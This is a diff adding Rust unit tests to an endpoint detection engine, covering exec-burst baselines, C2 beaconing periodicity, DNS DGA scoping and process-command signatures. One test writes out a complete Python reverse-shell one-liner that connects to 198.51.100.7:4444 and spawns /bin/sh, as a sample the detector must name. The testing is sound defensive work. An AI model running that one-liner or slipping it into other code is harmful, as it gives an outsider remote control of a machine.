@@ -803,3 +803,140 @@ fn rafix_only_gated_behavioral_alarms_enter_ml_alarm_count() {
         }
     }
 }
+
+#[test]
+fn rafix_exec_burst_uses_warmed_parent_rate_not_uid_or_cadence() {
+    let mut b = BehavioralEngine::new();
+    b.calibrate(vec![0.1; 100], 0.01);
+    let mut e = event("worker", "worker --job fixture");
+    for _ in 0..120 {
+        assert!(b.observe(&e).is_empty(), "boot warm-up");
+    }
+    for t in 0..601 {
+        e.ts_unix = t;
+        e.pid = (1000 + t) as u32;
+        assert!(b.observe(&e).is_empty());
+    }
+    e.ts_unix = 601;
+    for _ in 0..20 {
+        assert!(b.observe(&e).is_empty(), "small admin burst");
+    }
+    let mut hits = 0;
+    for i in 0..500 {
+        e.pid = 8000 + i;
+        hits += b
+            .observe(&e)
+            .iter()
+            .filter(|a| a.dimension == "exec_burst" && a.gated && a.magnitude == 1.5)
+            .count();
+    }
+    assert_eq!(hits, 1);
+    let mut b = BehavioralEngine::new();
+    b.calibrate(vec![0.1; 100], 0.01);
+    for t in 0..700 {
+        e.ts_unix = t;
+        for _ in 0..30 {
+            assert!(b.observe(&e).is_empty(), "steady compiler workload");
+        }
+    }
+    e.ts_unix = 700;
+    for _ in 0..150 {
+        assert!(b.observe(&e).is_empty(), "less than 10x the warmed rate");
+    }
+    let mut sparse = BehavioralEngine::new();
+    sparse.calibrate(vec![0.1; 100], 0.01);
+    e.ts_unix = 0;
+    sparse.observe(&e);
+    e.ts_unix = 600;
+    for _ in 0..120 {
+        assert!(
+            sparse.observe(&e).is_empty(),
+            "elapsed time alone is not a mature rate baseline"
+        );
+    }
+}
+#[test]
+fn rafix_periodic_beacon_context_works_without_event_sizes() {
+    let mut b = detection::BeaconingTracker::new();
+    let mut now = 0;
+    let mut detected = false;
+    for i in 0..30 {
+        now += [48, 60, 72][i % 3];
+        let result = b.observe("45.33.12.9:443", now, 0);
+        if i < 12 {
+            assert!(!result.detected, "periodicity needs twelve intervals");
+        }
+        detected |= result.detected;
+    }
+    assert!(detected);
+    for destination in ["10.0.0.5:443", "127.0.0.1:443", "::1:443"] {
+        for i in 0..30 {
+            assert!(!b.observe(destination, i * 60, 0).detected);
+        }
+    }
+    for (destination, interval) in [("45.33.12.10:443", 1), ("45.33.12.11:443", 21601)] {
+        for i in 0..30 {
+            assert!(!b.observe(destination, i * interval, 0).detected);
+        }
+    }
+    let mut d = DetectionEngine::default_with_rules();
+    d.layer4
+        .configure_control_plane(42, vec![("45.33.12.9".into(), 443)]);
+    let mut e = event("eguard-agent", "");
+    e.event_class = EventClass::NetworkConnect;
+    // Use a different process name so the generic process allowlist is not the exclusion.
+    e.process = "client".into();
+    e.dst_ip = Some("45.33.12.9".into());
+    e.dst_port = Some(443);
+    for i in 0..30 {
+        e.ts_unix = i * 60;
+        assert!(!d.process_event(&e).signals.c2_beaconing_detected);
+    }
+}
+
+#[test]
+fn rafix_dns_dga_parent_fanout_and_process_scoping() {
+    let mut b = BehavioralEngine::new();
+    b.calibrate(vec![0.1; 100], 0.01);
+    let mut e = event("resolver", "");
+    e.event_class = EventClass::DnsQuery;
+    let mut hits = 0;
+    for i in 0..30 {
+        e.ts_unix = i;
+        e.dst_domain = Some(format!("az7ql2mn9xr4vb6kp{i:02}.com"));
+        hits += b
+            .observe(&e)
+            .iter()
+            .filter(|a| a.dimension == "dns_dga" && a.gated)
+            .count();
+    }
+    assert_eq!(hits, 1);
+    let mut b = BehavioralEngine::new();
+    b.calibrate(vec![0.1; 100], 0.01);
+    for i in 0..40 {
+        e.pid = 100 + i as u32 % 2;
+        e.ts_unix = i;
+        e.dst_domain = Some(format!("az7ql2mn9xr4vb6kp{i:02}.t.attacker.net"));
+        assert!(
+            b.observe(&e).is_empty(),
+            "different processes must not create a combined fanout"
+        );
+    }
+}
+
+#[test]
+fn rafix_python_json_is_quiet_but_structural_reverse_shell_is_named() {
+    let benign = event(
+        "python3",
+        "python3 -c 'import json,sys;print(json.load(sys.stdin)[\"version\"])'",
+    );
+    let o = DetectionEngine::default_with_rules().process_event(&benign);
+    assert_eq!(o.confidence, Confidence::None);
+    assert!(!o.ml_score.unwrap().positive);
+    let attack = event("python3", "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"198.51.100.7\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn(\"/bin/sh\")'");
+    let o = DetectionEngine::default_with_rules().process_event(&attack);
+    assert!(o
+        .layer1
+        .matched_signatures
+        .contains(&"python_socket_stdio_reverse_shell".into()));
+}
